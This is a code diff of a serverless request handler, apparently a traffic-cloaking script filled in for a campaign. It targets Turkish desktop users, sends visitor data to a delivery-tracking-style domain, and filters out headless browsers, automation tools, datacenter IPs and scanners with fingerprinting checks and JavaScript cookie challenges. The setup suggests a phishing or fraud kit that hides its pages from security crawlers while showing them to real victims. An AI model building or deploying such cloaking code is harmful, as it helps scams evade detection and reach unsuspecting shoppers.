@@ -13,19 +13,15 @@ async function handleRequest(request) {
   const referer = request.headers.get("referer") || ""
   const cookie = request.headers.get("cookie") || ""
 
-  // CONFIG (PHP replace edecek)
-  const TARGET_URL = "__TARGET_URL__"
-  const ALLOWED_COUNTRY = "__COUNTRY__"
-  const ENABLED_BOT_FILTERS = __BOT_FILTERS__
-  const ENABLED_DEVICES = __DEVICES__
-  const CAMPAIGN_ID = "__CAMPAIGN_ID__"
-  const LOG_ENDPOINT = "__LOG_ENDPOINT__" // örn: https://domain.com/api/log_visit.php
+  const TARGET_URL = "https:\/\/pazarama.com"
+  const ALLOWED_COUNTRY = "TR"
+  const ENABLED_BOT_FILTERS = ["headless","datacenter","ua","behavior","js_challenge","rate_limit","fingerprint"]
+  const ENABLED_DEVICES = ["desktop"]
+  const CAMPAIGN_ID = "cmp_698d450683a2b"
+  const LOG_ENDPOINT = "https:\/\/gonderisorgula.xyz\/api\/log_visit.php"
 
   let detectedBy = null
 
-  // ========================
-  // LOG FUNCTION
-  // ========================
   async function sendLog(isBot, filterHit = null) {
     try {
       await fetch(LOG_ENDPOINT, {
@@ -41,14 +37,9 @@ async function handleRequest(request) {
           status: isBot ? "blocked" : "allowed"
         })
       })
-    } catch (e) {
-      // log hatası sistemi bozmasın
-    }
+    } catch (e) {}
   }
 
-  // ========================
-  // BOT CHECK
-  // ========================
   function isBot() {
 
     if (ENABLED_BOT_FILTERS.includes("headless") && /HeadlessChrome|puppeteer|selenium|phantomjs|webdriver/i.test(userAgent)) {
@@ -76,7 +67,6 @@ async function handleRequest(request) {
       }
     }
 
-    // ✅ YENİ: AUTOMATION FLAGS
     if (ENABLED_BOT_FILTERS.includes("automation_flags")) {
       if (/webdriver|playwright|automation/i.test(userAgent)) {
         detectedBy = "automation_flags"
@@ -84,7 +74,6 @@ async function handleRequest(request) {
       }
     }
 
-    // ✅ YENİ: ACCEPT HEADER MISMATCH
     if (ENABLED_BOT_FILTERS.includes("accept_mismatch")) {
       if (!accept.includes("text/html")) {
         detectedBy = "accept_mismatch"
@@ -92,7 +81,6 @@ async function handleRequest(request) {
       }
     }
 
-    // ✅ YENİ: SUSPICIOUS REFERER
     if (ENABLED_BOT_FILTERS.includes("suspicious_referer")) {
       if (referer && !referer.startsWith("https://") && !referer.startsWith("http://")) {
         detectedBy = "suspicious_referer"
@@ -100,7 +88,6 @@ async function handleRequest(request) {
       }
     }
 
-    // ✅ YENİ: IP ENTROPY (basit heuristic)
     if (ENABLED_BOT_FILTERS.includes("ip_entropy")) {
       if (/^(\d+)\.\1\.\1\.\1$/.test(ip)) {
         detectedBy = "ip_entropy"
@@ -111,14 +98,10 @@ async function handleRequest(request) {
     if (ENABLED_BOT_FILTERS.includes("js_challenge")) {
       if (!cookie.includes("verified=true")) {
         detectedBy = "js_challenge"
-        throw new Response(`
-          <html><body>
-          <script>
-          document.cookie = "verified=true; path=/";
-          location.reload();
-          </script>
-          </body></html>
-        `, { headers: { "Content-Type": "text/html" } })
+        return new Response(
+          "<html><body><script>document.cookie='verified=true; path=/'; location.reload();</script></body></html>",
+          { headers: { "Content-Type": "text/html" } }
+        )
       }
     }
 
@@ -164,13 +147,10 @@ async function handleRequest(request) {
     if (ENABLED_BOT_FILTERS.includes("entropy")) {
       if (!cookie.includes("human=true")) {
         detectedBy = "entropy"
-        throw new Response(`
-          <html><body>
-          <script>
-          document.cookie = "human=true; path=/";
-          </script>
-          </body></html>
-        `, { headers: { "Content-Type": "text/html" } })
+        return new Response(
+          "<html><body><script>document.cookie='human=true; path=/';</script></body></html>",
+          { headers: { "Content-Type": "text/html" } }
+        )
       }
     }
 
@@ -200,17 +180,18 @@ async function handleRequest(request) {
     return new Response("Access denied.", { status: 403 })
   }
 
-  try {
-    if (isBot()) {
-      await sendLog(true, detectedBy)
-      return new Response("Bot traffic blocked.", {
-        status: 403,
-        headers: { "X-Bot-Detected-By": detectedBy || "unknown" }
-      })
-    }
-  } catch (resp) {
+  const botResult = isBot()
+  if (botResult instanceof Response) {
     await sendLog(false, "js_challenge")
-    return resp
+    return botResult
+  }
+
+  if (botResult === true) {
+    await sendLog(true, detectedBy)
+    return new Response("Bot traffic blocked.", {
+      status: 403,
+      headers: { "X-Bot-Detected-By": detectedBy || "unknown" }
+    })
   }
 
   if (!isAllowedDevice()) {
